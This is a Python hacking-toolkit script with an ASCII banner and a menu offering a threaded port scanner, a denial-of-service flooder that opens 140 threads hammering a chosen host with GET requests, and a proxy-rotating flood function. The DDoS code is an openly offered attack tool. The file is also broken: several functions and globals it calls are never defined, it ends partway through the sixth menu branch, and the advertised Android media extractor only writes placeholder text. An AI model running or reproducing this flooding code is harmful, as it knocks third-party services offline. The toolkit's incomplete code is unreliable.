import socket
import threading
from queue import Queue
from time import sleep
from colorama import Fore, Style
from pyfiglet import figlet_format
import os
import random
import requests
from user_agent import generate_user_agent
import time, sys

# Define color codes
Black = "\033[0;30m"
Red = "\033[0;31m"
Green = "\033[0;32m"
Yellow = "\033[0;33m"
Blue = "\033[0;34m"
Purple = "\033[0;35m"
Cyan = "\033[0;36m"
White = "\033[0;37m"

# Function to print text with delay (to simulate animation effect)
def print_with_delay(text, delay=0.01):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

# Banner for Port Scanner
banner_port_scanner = f"{Yellow}\
██▓███   ▒█████   ██▀███  ▄▄▄█████▓     ██████  ▄████▄   ▄▄▄       ███▄    █  ███▄    █ ▓█████  ██▀███  \n\
▓██░  ██▒▒██▒  ██▒▓██ ▒ ██▒▓  ██▒ ▓▒   ▒██    ▒ ▒██▀ ▀█  ▒████▄     ██ ▀█   █  ██ ▀█   █ ▓█   ▀ ▓██ ▒ ██▒\n\
▓██░ ██▓▒▒██░  ██▒▓██ ░▄█ ▒▒ ▓██░ ▒░   ░ ▓██▄   ▒▓█    ▄ ▒██  ▀█▄  ▓██  ▀█ ██▒▓██  ▀█ ██▒▒███   ▓██ ░▄█ ▒\n\
▒██▄█▓▒ ▒▒██   ██░▒██▀▀█▄  ░ ▓██▓ ░      ▒   ██▒▒▓▓▄ ▄██▒░██▄▄▄▄██ ▓██▒  ▐▌██▒▓██▒  ▐▌██▒▒▓█  ▄ ▒██▀▀█▄  \n\
▒██▒ ░  ░░ ████▓▒░░██▓ ▒██▒  ▒██▒ ░    ▒██████▒▒▒ ▓███▀ ░ ▓█   ▓██▒▒██░   ▓██░▒██░   ▓██░░▒████▒░██▓ ▒██▒\
{Style.RESET_ALL}"

# Queue for threads
queue = Queue()
open_ports = []

# Function to create a file with user-defined name and content
def create_file():
    file_name = input(f"{Cyan}[+] Enter the file name (e.g., output.txt): {Style.RESET_ALL}").strip()
    if not file_name:
        file_name = "default_output.txt"  # Default file name if none is provided

    content = f"""
    {Green}[+] This is the content of the file.
    You can customize the content of the file here.
    This is just an example.
    {Style.RESET_ALL}
    """

    try:
        with open(file_name, 'w') as file:
            file.write(content)
        print(f"{Green}[+] File '{file_name}' created successfully!{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Red}[!] Failed to create the file: {e}{Style.RESET_ALL}")

# Port Scanner Function
def port_scanner():
    print(banner_port_scanner)
    
    # Get Target URL or IP
    target = input(f"{Cyan}[+] Enter The Target (IP or domain, e.g., example.com): {Style.RESET_ALL}").strip()
    
    # Resolve Domain to IP
    try:
        host_ip = socket.gethostbyname(target)
        print(f"Scanning Target: {host_ip} ({target})")
    except socket.gaierror:
        print(f"{Red}[!] Invalid Target{Style.RESET_ALL}")
        return

    # Set Number of Threads
    thr = input(f"{Cyan}[+] Enter Number of Threads (default: 100): {Style.RESET_ALL}") or 100
    
    # Function to scan individual ports
    def port_scan(port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            if s.connect_ex((host_ip, port)) == 0:  # Successful connection
                print(f"{Green}[+] Port {port} is open{Style.RESET_ALL}")
                open_ports.append(port)
            s.close()
        except Exception:
            pass

    # Function to fill the queue with port numbers
    def fill_queue(port_range):
        for port in port_range:
            queue.put(port)

    # Function for threads to scan ports from queue
    def scan_ports():
        while not queue.empty():
            port = queue.get()
            port_scan(port)
            queue.task_done()

    # Range of ports (from 1 to 65535)
    port_list = range(1, 65536)  # All possible ports

    # Fill queue with all ports
    fill_queue(port_list)

    # Create and start threads
    threads = []
    for _ in range(int(thr)):
        thread = threading.Thread(target=scan_ports)
        thread.daemon = True
        threads.append(thread)
        thread.start()

    # Wait for all threads to finish
    queue.join()

    # Print open ports
    if open_ports:
        print(f"{Green}[+] Open Ports: {', '.join(map(str, open_ports))}{Style.RESET_ALL}")
    else:
        print(f"{Red}[!] No Open Ports Found{Style.RESET_ALL}")

# DDoS Attack without Proxies
def Ddos1():
    global n
    global hostIP
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(hostIP), Port))
            s.sendto(("GET /" + str(hostIP) + " HTTP/1.1\r\n").encode('ascii'), (str(hostIP), Port))
            s.close()
            n += 1
            print(f"{Green}[{n}] Packets were sent Successfully <{hostIP}:{Port}>{Style.RESET_ALL}")
        except:
            print(f"{Red}[-] No Connections! maybe Server fell <{hostIP}:{Port}>{Style.RESET_ALL}")

# DDoS Attack using Proxies
def Secret_Ddos():
    global n
    global bots
    global hostIP
    with open('proxies.txt', 'r') as prox:
        broxies = prox.read().split()
    
    url2 = random.choice(bots) + "http://" + hostname
    proxy = str(random.choice(broxies))
    proxy2 = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}

    while True:
        try:
            req = requests.post(url2, headers=head, proxies=proxy2, timeout=5)
            n += 1
            print(f"{Green}[{n}] Packets were sent Successfully <{hostIP}:{Port}>{Style.RESET_ALL}")
        except:
            print(f"{Red}[-] No Connections! maybe Server fell <{hostIP}:{Port}>{Style.RESET_ALL}")

# Main Menu
if __name__ == "__main__":
    print_with_delay(f"{Cyan}{figlet_format('MR_EREN', font='big', width=64)}")
    

    print(f"{Blue}Select the tool:{Style.RESET_ALL}")
    print("1. Admin Page Finder")
    print("2. Link Extractor")
    print("3. Port Scanner")
    print("4. Create a file capable of extracting all images and videos from all Android paths. All you have to do is modify it to suit your method or uses.")
    print("5. DDoS Attack (without Proxies)")
    print("6. DDoS Attack (using Proxies)")

    choice = input(f"{Cyan}Enter choice: {Style.RESET_ALL}")
    if choice == '1':
        admin_page_finder()
    elif choice == '2':
        link_extractor()
    elif choice == '3':
        port_scanner()
    elif choice == '4':
        create_file()  # Call the function to create a file
    elif choice == '5':
        # Implement DDoS attack without proxies
        option = input(f"{Cyan}[+] Please Select Port (Default: 80) >> {Style.RESET_ALL}")
        Port = int(option) if option else 80
        hostIP = socket.gethostbyname(input(f"{Cyan}[+] Enter The Url (like : example.com) >> {Style.RESET_ALL}"))
        for i in range(140):
            t = threading.Thread(target=Ddos1)
            t.start()
    elif choice == '6':
        # Implement DDoS attack using proxies
        option = input(f"{Cyan}[+] Please Select Port (Default: 80) >> {Style.RESET_ALL}")
